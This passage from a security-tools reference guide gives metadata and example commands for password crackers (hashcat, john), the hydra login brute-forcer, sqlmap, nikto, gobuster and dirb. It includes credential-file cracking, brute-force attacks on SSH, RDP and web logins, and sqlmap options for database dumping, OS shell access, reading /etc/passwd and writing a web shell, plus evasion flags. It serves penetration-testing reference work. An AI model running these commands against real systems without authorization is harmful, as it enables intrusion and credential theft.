hashcat -m 1800 -a 0 shadow.txt wordlist.txt

# Crack NTLM (Windows)
hashcat -m 1000 -a 0 ntlm.txt wordlist.txt -r best64.rule

# Crack with brute-force (8 chars, all types)
hashcat -m 1400 -a 3 sha256.txt ?a?a?a?a?a?a?a?a

# Crack bcrypt
hashcat -m 3200 -a 0 bcrypt.txt wordlist.txt -O -w 3

# WiFi WPA/WPA2
hashcat -m 22000 -a 0 capture.hccapx wordlist.txt

# Combinator attack (combine two wordlists)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Advanced mask with increment
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a --increment --increment-min 4

# Status and monitoring
hashcat -m 0 -a 0 hash.txt wordlist.txt --status        # Enable status
hashcat -m 0 -a 0 hash.txt wordlist.txt --status-timer 10  # Status every 10s

# Debugging
hashcat -m 0 -a 0 hash.txt wordlist.txt --debug-mode 1  # Show debug info
hashcat -m 0 -a 0 hash.txt wordlist.txt --quiet         # Minimal output

# Hash format examples
# MD5: 5f4dcc3b5aa765d61d8327deb882cf99
# SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# NTLM: 8846f7eaee8fb117ad06bdd830b7586c
# SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

---


### **john** - John the Ripper Password Cracker**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #password-cracking, #penetration-testing, #auditing]
related: [hashcat, hydra, openssl]
keywords: [john, john the ripper, password cracking, password auditing, security testing]
synonyms: [jtr, password-cracker, ripper]
platform: [macOS, Linux, Windows]
installation: brew install john-jumbo
-->
**Description**: Fast password cracker for Unix/Linux systems - the classic password security auditing tool
**Location**: `/opt/homebrew/bin/john`
**Common Use Cases**:

- Password auditing
- Security assessments
- Unix password cracking
- Hash analysis
- Penetration testing
- Password policy enforcement

**Why Essential**: Long-standing standard for password cracking, especially effective for Unix/Linux systems.

**See Also**: `hashcat` (GPU alternative), `hydra` (network attacks), `unshadow` (shadow file prep)

**Examples**:

```bash
# Basic usage
john passwords.txt                      # Crack passwords in file
john --show passwords.txt               # Show cracked passwords
john --wordlist=rockyou.txt hashes.txt  # Dictionary attack

# Prepare files
# Combine /etc/passwd and /etc/shadow
unshadow /etc/passwd /etc/shadow > mypasswd.txt
john mypasswd.txt

# Attack modes
john --single hashes.txt                # Single crack mode (fast)
john --wordlist=wordlist.txt hashes.txt # Wordlist mode
john --incremental hashes.txt           # Incremental mode (brute force)
john --external=mode hashes.txt         # External mode

# Hash formats
john --format=md5 hashes.txt            # MD5
john --format=sha256 hashes.txt         # SHA256
john --format=sha512crypt hashes.txt    # SHA512 (Linux)
john --format=bcrypt hashes.txt         # bcrypt
john --format=NT hashes.txt             # Windows NTLM
john --format=raw-md5 hashes.txt        # Raw MD5
john --list=formats                     # List all supported formats

# Rules
john --wordlist=wordlist.txt --rules hashes.txt       # Apply default rules
john --wordlist=wordlist.txt --rules=Jumbo hashes.txt # Jumbo ruleset
john --wordlist=wordlist.txt --rules=KoreLogic hashes.txt

# Session management
john --session=mysession hashes.txt     # Start named session
john --restore=mysession                # Restore session
john --status=mysession                 # Show session status

# Advanced options
john --fork=4 hashes.txt                # Use 4 CPU cores
john --pot=mypot.txt hashes.txt         # Custom pot file
john --show --pot=mypot.txt hashes.txt  # Show from specific pot

# Password generation
john --stdout --wordlist=wordlist.txt | head -100  # Generate candidates
john --stdout --incremental | head -1000           # Incremental generation

# Mask mode (requires jumbo version)
john --mask='?l?l?l?l?d?d' hashes.txt  # 4 lowercase + 2 digits
john --mask='?u?l?l?l?l?d?d?d' hashes.txt  # Ulllldd pattern

# Charset definitions for masks
# ?l = lowercase
# ?u = uppercase
# ?d = digits
# ?s = special characters
# ?a = all printable ASCII
# ?h = lowercase hex
# ?H = uppercase hex

# Benchmarking
john --test                             # Run benchmarks
john --test=5                           # Run for 5 seconds
john --test --format=md5                # Test specific format

# Practical examples
# Crack Linux shadow file
sudo unshadow /etc/passwd /etc/shadow > shadow.txt
john shadow.txt

# Dictionary attack with rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules shadow.txt

# Crack with specific format
john --format=raw-md5 --wordlist=wordlist.txt md5hashes.txt

# Show statistics
john --show shadow.txt
john --show --format=raw-md5 md5hashes.txt

# Incremental mode with charset
john --incremental=alpha hashes.txt     # Letters only
john --incremental=digits hashes.txt    # Digits only
john --incremental=alnum hashes.txt     # Alphanumeric

# External filter (custom mode)
# Create custom john.conf section and run:
john --external=CustomFilter hashes.txt

# Crack specific user
john --users=admin,root shadow.txt

# Time limit
john --max-run-time=3600 hashes.txt     # Run for 1 hour

# Real-world examples
# Windows NTLM hashes
john --format=NT --wordlist=rockyou.txt ntlm.txt

# MySQL passwords
john --format=mysql-sha1 --wordlist=wordlist.txt mysql.txt

# PostgreSQL passwords
john --format=postgres --wordlist=wordlist.txt postgres.txt

# ZIP password
zip2john encrypted.zip > zip.hash
john zip.hash

# RAR password
rar2john encrypted.rar > rar.hash
john rar.hash

# SSH private key
ssh2john id_rsa > ssh.hash
john ssh.hash

# Office documents
office2john document.docx > office.hash
john office.hash

# PDF password
pdf2john encrypted.pdf > pdf.hash
john pdf.hash

# Hash identifier
# Create hash with OpenSSL and crack it
echo -n "password" | openssl md5
# Output: 5f4dcc3b5aa765d61d8327deb882cf99
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 --wordlist=wordlist.txt hash.txt
```

---


### **hydra** - Network Login Cracker**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #network, #brute-force, #penetration-testing, #authentication]
related: [nmap, john, hashcat, medusa]
keywords: [hydra, network brute force, login cracker, password attack, network authentication, protocol cracker]
synonyms: [thc-hydra, network-cracker, login-bruteforcer]
platform: [macOS, Linux]
installation: brew install hydra
-->
**Description**: Fast network login cracker supporting many protocols - parallelized brute force attacks
**Location**: `/opt/homebrew/bin/hydra`
**Common Use Cases**:

- Network service password auditing
- Penetration testing
- Security assessments
- Authentication testing
- Weak password detection
- Service hardening verification

**Why Essential**: De facto standard for testing authentication security across 50+ network protocols.

**See Also**: `medusa` (similar tool), `nmap` (port scanning), `john` (offline cracking)

**Examples**:

```bash
# Supported protocols (50+)
# SSH, FTP, HTTP(S), SMTP, POP3, IMAP, MySQL, PostgreSQL, VNC, RDP, SMB,
# Telnet, LDAP, SNMP, MS-SQL, Oracle, Cisco, and many more

# Basic syntax
hydra -l user -p password target.com service
hydra -L users.txt -P passwords.txt target.com service

# Single user, wordlist
hydra -l admin -P passwords.txt 192.168.1.1 ssh
hydra -l admin -P rockyou.txt ftp://192.168.1.1

# User list, password list
hydra -L users.txt -P passwords.txt 192.168.1.1 ssh
hydra -L users.txt -P passwords.txt mysql://192.168.1.1

# SSH attacks
hydra -l root -P passwords.txt ssh://192.168.1.1
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.1  # Custom port
hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.1 # 4 parallel tasks

# FTP attacks
hydra -l admin -P passwords.txt ftp://192.168.1.1
hydra -L users.txt -p password123 ftp://192.168.1.1

# HTTP/HTTPS attacks
# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# HTTPS POST
hydra -l admin -P passwords.txt -s 443 192.168.1.1 https-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"

# WordPress
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"

# Database attacks
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.1

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.1

# MS-SQL
hydra -l sa -P passwords.txt mssql://192.168.1.1

# Email protocols
# SMTP
hydra -l user@example.com -P passwords.txt smtp://mail.example.com

# POP3
hydra -l user -P passwords.txt pop3://mail.example.com

# IMAP
hydra -l user -P passwords.txt imap://mail.example.com

# Remote access
# RDP (Remote Desktop)
hydra -l Administrator -P passwords.txt rdp://192.168.1.1

# VNC
hydra -P passwords.txt vnc://192.168.1.1

# Telnet
hydra -l admin -P passwords.txt telnet://192.168.1.1

# SMB/Windows shares
hydra -l administrator -P passwords.txt smb://192.168.1.1

# Performance tuning
hydra -l admin -P passwords.txt -t 16 ssh://192.168.1.1   # 16 parallel connections
hydra -l admin -P passwords.txt -t 4 -w 30 ssh://192.168.1.1  # 30 sec timeout
hydra -l admin -P passwords.txt -W 60 ssh://192.168.1.1   # Wait time between connections

# Output options
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.1
hydra -l admin -P passwords.txt -b json -o results.json ssh://192.168.1.1

# Verbose and debugging
hydra -l admin -P passwords.txt -v ssh://192.168.1.1      # Verbose
hydra -l admin -P passwords.txt -V ssh://192.168.1.1      # Very verbose (show attempts)
hydra -l admin -P passwords.txt -d ssh://192.168.1.1      # Debug mode

# Resume attacks
hydra -l admin -P passwords.txt -R ssh://192.168.1.1      # Resume previous session

# Advanced options
hydra -l admin -P passwords.txt -e nsr ssh://192.168.1.1  # Try null, same as login, reversed
hydra -l admin -P passwords.txt -f ssh://192.168.1.1      # Exit on first found password
hydra -l admin -P passwords.txt -F ssh://192.168.1.1      # Exit when password found for any user

# Proxy support
hydra -l admin -P passwords.txt -m /proxy.txt ssh://192.168.1.1

# Multiple targets
hydra -l admin -P passwords.txt -M targets.txt ssh

# Custom user-agent (HTTP)
hydra -l admin -P passwords.txt -m "User-Agent: Custom" http-get://192.168.1.1/admin

# Practical examples
# Test SSH with common passwords
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.1

# Test web login form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:S=Dashboard"

# Test multiple users on FTP
hydra -L users.txt -P passwords.txt -e nsr ftp://192.168.1.1

# Test MySQL with default credentials
hydra -L users.txt -P passwords.txt mysql://192.168.1.1

# Combination with nmap
nmap -p 22 --open 192.168.1.0/24 -oG - | awk '/22\/open/{print $2}' > ssh_hosts.txt
hydra -l root -P passwords.txt -M ssh_hosts.txt ssh

# Generate password list on-the-fly
crunch 4 6 0123456789 | hydra -l admin -P - ssh://192.168.1.1

# Test with username as password
hydra -L users.txt -e sr ftp://192.168.1.1

# Real-world scenarios
# WordPress brute force (be careful - use only for authorized testing!)
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR" -V

# RDP brute force (Windows)
hydra -l Administrator -P passwords.txt rdp://192.168.1.1 -t 4

# Find weak MySQL passwords
hydra -l root -P common-passwords.txt mysql://192.168.1.1 -f

# SMTP authentication test
hydra -l user@example.com -P passwords.txt -s 587 smtp://mail.example.com
```

---


## Web Security & Application Testing

### **sqlmap** - Automatic SQL Injection Tool**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #web, #sql-injection, #penetration-testing, #database]
related: [nikto, gobuster, burpsuite, nmap]
keywords: [sqlmap, sql injection, database exploitation, web security, penetration testing, database dumping]
synonyms: [sql-injection-tool, database-hacker]
platform: [macOS, Linux, Windows]
installation: brew install sqlmap
-->
**Description**: Automatic SQL injection and database takeover tool - detects and exploits SQL injection flaws
**Location**: `/opt/homebrew/bin/sqlmap`
**Common Use Cases**:

- SQL injection testing
- Database enumeration
- Data extraction
- Web application security
- Penetration testing
- Database fingerprinting

**Why Essential**: Industry standard for automated SQL injection detection and exploitation.

**See Also**: `nikto` (web scanner), `burpsuite` (web proxy), `nmap` (port scanning)

**Examples**:

```bash
# Basic scans
sqlmap -u "http://target.com/page.php?id=1"                     # Basic scan
sqlmap -u "http://target.com/page.php?id=1" --dbs               # List databases
sqlmap -u "http://target.com/page.php?id=1" --tables            # List tables
sqlmap -u "http://target.com/page.php?id=1" --columns           # List columns

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --current-db        # Current database
sqlmap -u "http://target.com/page.php?id=1" --current-user      # Current user
sqlmap -u "http://target.com/page.php?id=1" --is-dba            # Check if DBA
sqlmap -u "http://target.com/page.php?id=1" --users             # Database users
sqlmap -u "http://target.com/page.php?id=1" --passwords         # User passwords

# Specific database/table operations
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name --columns
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name --dump
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name -C column1,column2 --dump

# POST requests
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"
sqlmap -u "http://target.com/search.php" --data="q=test" -p q  # Test parameter 'q'

# Cookie-based injection
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abcd1234"
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2

# Headers injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1.2.3.4*"
sqlmap -u "http://target.com/page.php" -H "User-Agent: sqlmap"

# Request from file
sqlmap -r request.txt                                           # Use saved request
sqlmap -r request.txt -p parameter                              # Test specific param

# Techniques and levels
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST   # All techniques
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time-based
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3  # Aggressive scan

# Database management system fingerprinting
sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL        # Assume MySQL
sqlmap -u "http://target.com/page.php?id=1" --fingerprint       # Detailed fingerprint

# OS shell access
sqlmap -u "http://target.com/page.php?id=1" --os-shell          # Get OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-cmd=whoami     # Execute command
sqlmap -u "http://target.com/page.php?id=1" --sql-shell         # SQL shell

# File operations
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Authentication bypass
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --auth-type=Basic --auth-cred="admin:pass"
sqlmap -u "http://target.com/page.php" --auth-type=Digest --auth-cred="user:pass"

# Proxy usage
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"  # Tor

# Output options
sqlmap -u "http://target.com/page.php?id=1" -v 3                # Verbose level
sqlmap -u "http://target.com/page.php?id=1" --batch             # Never ask for input
sqlmap -u "http://target.com/page.php?id=1" --flush-session     # Flush session
sqlmap -u "http://target.com/page.php?id=1" --fresh-queries     # Fresh queries

# Evasion techniques
sqlmap -u "http://target.com/page.php?id=1" --random-agent      # Random user agent
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment  # Tamper script
sqlmap -u "http://target.com/page.php?id=1" --delay=2           # Delay between requests

# Practical examples
# Quick vulnerability check
sqlmap -u "http://target.com/product.php?id=1" --batch --dbs

# Full database dump
sqlmap -u "http://target.com/page.php?id=1" -D mydb --dump-all

# Search for specific data
sqlmap -u "http://target.com/page.php?id=1" -D mydb --search -C password

# Scan all parameters
sqlmap -u "http://target.com/search.php?q=test&sort=asc" --batch

# With Burp Suite request
# Save request from Burp to file, then:
sqlmap -r burp_request.txt --batch --level=5 --risk=3

# WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase --random-agent
```

---


### **nikto** - Web Server Scanner**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #web, #vulnerability-scanner, #penetration-testing, #web-server]
related: [nmap, sqlmap, gobuster, dirb]
keywords: [nikto, web scanner, vulnerability scanner, web security, server audit, cgi scanner]
synonyms: [web-scanner, vulnerability-scanner]
platform: [macOS, Linux]
installation: brew install nikto
-->
**Description**: Web server scanner that performs comprehensive tests against web servers
**Location**: `/opt/homebrew/bin/nikto`
**Common Use Cases**:

- Web server vulnerability scanning
- Configuration auditing
- Outdated software detection
- Security assessments
- Penetration testing
- Compliance checking

**Why Essential**: Comprehensive web server scanner with 6700+ potentially dangerous files/CGIs checks.

**See Also**: `nmap` (port scanning), `sqlmap` (SQL injection), `gobuster` (directory brute force)

**Examples**:

```bash
# Basic scans
nikto -h http://target.com                          # Basic scan
nikto -h https://target.com                         # HTTPS scan
nikto -h 192.168.1.1                                # IP address
nikto -h target.com -p 80,443,8080                  # Multiple ports

# SSL/TLS
nikto -h https://target.com -ssl                    # Force SSL
nikto -h target.com -p 443 -ssl                     # SSL on specific port

# Authentication
nikto -h http://target.com -id user:pass            # Basic auth
nikto -h http://target.com -id user:pass -auth digest  # Digest auth

# Tuning options
nikto -h http://target.com -Tuning 1                # File upload
nikto -h http://target.com -Tuning 2                # Misconfigurations
nikto -h http://target.com -Tuning 3                # Info disclosure
nikto -h http://target.com -Tuning 4                # Injection (XSS/Script/HTML)
nikto -h http://target.com -Tuning 5                # Remote file retrieval
nikto -h http://target.com -Tuning 6                # Denial of Service
nikto -h http://target.com -Tuning 7                # Remote file retrieval (server wide)
nikto -h http://target.com -Tuning 8                # Command execution
nikto -h http://target.com -Tuning 9                # SQL injection
nikto -h http://target.com -Tuning 0                # File upload
nikto -h http://target.com -Tuning a                # Authentication bypass
nikto -h http://target.com -Tuning b                # Software identification
nikto -h http://target.com -Tuning c                # Remote source inclusion
nikto -h http://target.com -Tuning x                # Reverse tuning (exclude)

# Multiple tuning
nikto -h http://target.com -Tuning 123              # Tests 1, 2, and 3
nikto -h http://target.com -Tuning 9bc              # SQL, identification, RFI

# Output formats
nikto -h http://target.com -o output.txt            # Text output
nikto -h http://target.com -o output.html -Format html  # HTML report
nikto -h http://target.com -o output.xml -Format xml    # XML output
nikto -h http://target.com -o output.csv -Format csv    # CSV output

# Proxy usage
nikto -h http://target.com -useproxy http://proxy:8080
nikto -h http://target.com -useproxy http://127.0.0.1:8080  # Burp Suite

# User agents
nikto -h http://target.com -useragent "Mozilla/5.0..."
nikto -h http://target.com -useragent "Custom Agent"

# Virtual hosts
nikto -h 192.168.1.1 -vhost target.com              # Specify vhost
nikto -h 192.168.1.1 -vhost target.com,alt.com      # Multiple vhosts

# Performance
nikto -h http://target.com -maxtime 60s             # Max scan time
nikto -h http://target.com -timeout 5               # Request timeout
nikto -h http://target.com -Pause 2                 # Pause between tests

# Plugins
nikto -h http://target.com -list-plugins            # List plugins
nikto -h http://target.com -Plugins "@@ALL"         # All plugins
nikto -h http://target.com -Plugins "headers"       # Specific plugin

# Updating
nikto -update                                       # Update databases

# Multiple hosts
nikto -h hosts.txt                                  # Scan from file
# hosts.txt format:
# http://host1.com
# https://host2.com:8443
# 192.168.1.1

# Practical examples
# Quick scan
nikto -h http://target.com -Tuning x 6 -maxtime 120s

# Full comprehensive scan
nikto -h http://target.com -Tuning 123456789abc -o full_scan.html -Format html

# Scan with proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080 -o results.txt

# SSL/TLS scan
nikto -h target.com -p 443 -ssl -Tuning b -o ssl_scan.txt

# Find outdated software
nikto -h http://target.com -Tuning b -o software.txt

# Check for SQL injection points
nikto -h http://target.com -Tuning 9 -o sqli_check.txt

# Scan multiple ports on same host
nikto -h target.com -p 80,443,8000,8080,8443 -o multiport.txt

# Evasion
nikto -h http://target.com -evasion 1               # Random URI encoding
nikto -h http://target.com -evasion 2               # Directory self-reference
nikto -h http://target.com -evasion 3               # Premature URL ending
nikto -h http://target.com -evasion 4               # Prepend long random string
nikto -h http://target.com -evasion 5               # Fake parameter
nikto -h http://target.com -evasion 6               # TAB as request spacer
nikto -h http://target.com -evasion 7               # Change case
nikto -h http://target.com -evasion 8               # Use Windows directory separator
```

---


### **gobuster** - Directory/File Brute Forcer**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#security, #web, #brute-force, #directory-enumeration, #reconnaissance]
related: [dirb, nikto, ffuf, feroxbuster]
keywords: [gobuster, directory brute force, web enumeration, path discovery, dns enumeration, vhost discovery]
synonyms: [dir-buster, path-brute-forcer]
platform: [macOS, Linux, Windows]
installation: brew install gobuster
-->
**Description**: Fast directory/file, DNS and VHost brute-forcing tool written in Go
**Location**: `/opt/homebrew/bin/gobuster`
**Common Use Cases**:

- Directory enumeration
- Hidden file discovery
- DNS subdomain brute forcing
- Virtual host discovery
- Web reconnaissance
- Content discovery

**Why Essential**: Fast, efficient brute-forcing tool with multiple modes for comprehensive web reconnaissance.

**See Also**: `dirb` (similar tool), `ffuf` (faster fuzzer), `nikto` (vulnerability scanner)

**Examples**:

```bash
# Directory/file mode
gobuster dir -u http://target.com -w wordlist.txt               # Basic dir scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt  # Extensions

# Common wordlists
# /usr/share/wordlists/dirb/common.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /usr/share/seclists/Discovery/Web-Content/common.txt

# Extensions
gobuster dir -u http://target.com -w wordlist.txt -x php        # PHP files
gobuster dir -u http://target.com -w wordlist.txt -x php,html,js,txt
gobuster dir -u http://target.com -w wordlist.txt -x aspx,asp   # ASP/ASPX

# Status codes
gobuster dir -u http://target.com -w wordlist.txt -s 200,204,301,302,307,401,403
gobuster dir -u http://target.com -w wordlist.txt -b 404,500    # Blacklist codes

# Authentication
gobuster dir -u http://target.com -w wordlist.txt -U user -P password  # Basic auth
gobuster dir -u http://target.com -w wordlist.txt -c "SESSIONID=abc123"  # Cookies

# Headers
gobuster dir -u http://target.com -w wordlist.txt -H "Host: target.com"
gobuster dir -u http://target.com -w wordlist.txt -H "User-Agent: Custom"

# Performance
gobuster dir -u http://target.com -w wordlist.txt -t 50         # 50 threads
gobuster dir -u http://target.com -w wordlist.txt -t 100 --delay 100ms
gobuster dir -u http://target.com -w wordlist.txt --timeout 10s

# Output
gobuster dir -u http://target.com -w wordlist.txt -o results.txt
gobuster dir -u http://target.com -w wordlist.txt -q            # Quiet mode
gobuster dir -u http://target.com -w wordlist.txt -v            # Verbose

# Recursion
gobuster dir -u http://target.com -w wordlist.txt -r            # Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -k            # Skip SSL verify
gobuster dir -u http://target.com -w wordlist.txt -n            # No status output

# URL patterns
gobuster dir -u http://target.com/api -w wordlist.txt           # Specific path
gobuster dir -u http://target.com -w wordlist.txt -f            # Append / to requests

# DNS mode (subdomain enumeration)
gobuster dns -d target.com -w wordlist.txt                      # Basic DNS brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8           # Custom resolver
gobuster dns -d target.com -w wordlist.txt -i                   # Show IP addresses
gobuster dns -d target.com -w wordlist.txt -c                   # Show CNAME

# VHost mode (virtual host discovery)
gobuster vhost -u http://target.com -w wordlist.txt             # Basic vhost scan
gobuster vhost -u http://target.com -w wordlist.txt --append-domain
gobuster vhost -u http://192.168.1.1 -w wordlist.txt -H "Host: {GOBUSTER}.target.com"

# Proxy usage
gobuster dir -u http://target.com -w wordlist.txt --proxy http://127.0.0.1:8080
gobuster dir -u http://target.com -w wordlist.txt --proxy socks5://127.0.0.1:9050

# Practical examples
# Quick directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html

# Comprehensive scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50 -o results.txt

# Find admin panels
gobuster dir -u http://target.com -w wordlist-admin.txt -x php,html -s 200,301,302

# API endpoint discovery
gobuster dir -u http://target.com/api -w api-wordlist.txt -s 200,201,204

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -i

# Find backup files
gobuster dir -u http://target.com -w wordlist.txt -x bak,old,backup,zip,tar.gz

# Stealth scan (slow)
gobuster dir -u http://target.com -w wordlist.txt -t 5 --delay 1s

# With custom user agent
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Multiple extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml

# Case insensitive
gobuster dir -u http://target.com -w wordlist.txt --wildcard

# Filter by length
gobuster dir -u http://target.com -w wordlist.txt --exclude-length 1234
```

---


### **dirb** - Web Content Scanner**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#security, #web, #directory-enumeration, #reconnaissance, #brute-force]
related: [gobuster, nikto, dirbuster, ffuf]
keywords: [dirb, directory scanner, web content scanner, url brute force, hidden files]
synonyms: [directory-scanner, url-brute-forcer]
platform: [macOS, Linux]
installation: brew install dirb
-->
**Description**: Web content scanner that launches dictionary-based attacks against web servers
**Location**: `/opt/homebrew/bin/dirb`
**Common Use Cases**:

- Directory enumeration
- Hidden resource discovery
- Web reconnaissance
- Vulnerability assessment
- Penetration testing
- Content discovery

**Why Essential**: Classic web content scanner with built-in wordlists, widely used for web reconnaissance.

**See Also**: `gobuster` (faster alternative), `nikto` (vulnerability scanner), `ffuf` (web fuzzer)

**Examples**:

```bash
# Basic scans
dirb http://target.com                              # Default wordlist
dirb http://target.com /usr/share/dirb/wordlists/common.txt
dirb https://target.com /usr/share/dirb/wordlists/big.txt

# Built-in wordlists
# /usr/share/dirb/wordlists/common.txt
# /usr/share/dirb/wordlists/big.txt
# /usr/share/dirb/wordlists/small.txt
# /usr/share/dirb/wordlists/catala.txt
# /usr/share/dirb/wordlists/spanish.txt

# Extensions
dirb http://target.com wordlist.txt -X .php         # Single extension
dirb http://target.com wordlist.txt -X .php,.html,.txt  # Multiple extensions

# Authentication
dirb http://target.com -u user:password             # Basic auth
dirb http://target.com -u user:password -a "Custom User-Agent"

# Cookies
dirb http://target.com -c "PHPSESSID=abc123"        # Cookie
dirb http://target.com -c "session=xyz;auth=123"    # Multiple cookies

# Headers
dirb http://target.com -H "Authorization: Bearer token"
dirb http://target.com -H "X-Custom-Header: value"

# Proxy
dirb http://target.com -p http://127.0.0.1:8080     # HTTP proxy
dirb http://target.com -p http://user:pass@proxy:8080

# Speed control
dirb http://target.com wordlist.txt -z 100          # 100ms delay
dirb http://target.com wordlist.txt -z 1000         # 1 second delay

# Output
dirb http://target.com -o results.txt               # Save output
dirb http://target.com -o results.txt -S            # Silent mode (no output)

# Advanced options
dirb http://target.com -r                           # Non-recursive
dirb http://target.com -N 404                       # Ignore 404 status
dirb http://target.com -R                           # Interactive recursion
dirb http://target.com -f                           # Fine tuning of requests

# Case sensitivity
dirb http://target.com -i                           # Case insensitive

# Show non-existent pages
dirb http://target.com -v                           # Verbose (show tested)

# Custom wordlist
dirb http://target.com custom-wordlist.txt

# Practical examples
# Quick scan with common paths
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# Scan for PHP files
dirb http://target.com /usr/share/dirb/wordlists/big.txt -X .php

# Scan with authentication
dirb http://target.com /usr/share/dirb/wordlists/common.txt -u admin:password

# Scan through proxy (Burp Suite)
dirb http://target.com /usr/share/dirb/wordlists/common.txt -p http://127.0.0.1:8080

# Find backup files
dirb http://target.com backup-wordlist.txt -X .bak,.old,.backup,.zip

# Stealth scan (slow)
dirb http://target.com /usr/share/dirb/wordlists/common.txt -z 2000

# Comprehensive scan with output
dirb http://target.com /usr/share/dirb/wordlists/big.txt -X .php,.html,.txt,.js -o scan_results.txt

# API endpoint discovery
dirb http://target.com/api api-wordlist.txt

# Find admin panels
dirb http://target.com admin-wordlist.txt -X .php,.html

# With custom headers
dirb http://target.com /usr/share/dirb/wordlists/common.txt -H "X-Forwarded-For: 127.0.0.1"

# Save output and show non-existent
dirb http://target.com /usr/share/dirb/wordlists/common.txt -o results.txt -v
```

---


## Security Auditing & System Hardening

### **lynis** - Security Auditing Tool**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #auditing, #system-hardening, #compliance, #vulnerability-assessment]
related: [chkrootkit, clamav, rkhunter, aide]
keywords: [lynis, security audit, system hardening, compliance checking, vulnerability scanner, security assessment]
synonyms: [security-auditor, compliance-checker, hardening-tool]
platform: [macOS, Linux]
installation: brew install lynis
-->
**Description**: Comprehensive security auditing and hardening tool for Unix-based systems
**Location**: `/opt/homebrew/bin/lynis`
**Common Use Cases**:

- System security audits
- Compliance checking (PCI-DSS, HIPAA, ISO27001)
- Vulnerability assessment
- System hardening
- Security benchmarking
- Configuration review

**Why Essential**: Industry-standard security auditing tool with comprehensive checks for system hardening.

**See Also**: `chkrootkit` (rootkit detection), `clamav` (antivirus), `rkhunter` (rootkit hunter)

**Examples**:

```bash
# Basic audit
sudo lynis audit system                         # Full system audit
sudo lynis audit system --quick                 # Quick scan
sudo lynis audit system --cronjob               # Cron-friendly output

# Audit with specific tests
sudo lynis audit system --tests-from-group malware
sudo lynis audit system --tests-from-group authentication
sudo lynis audit system --tests-from-group networking
sudo lynis audit system --tests-from-group storage

# Test groups available:
# accounting, authentication, banners, boot, containers, crypto,
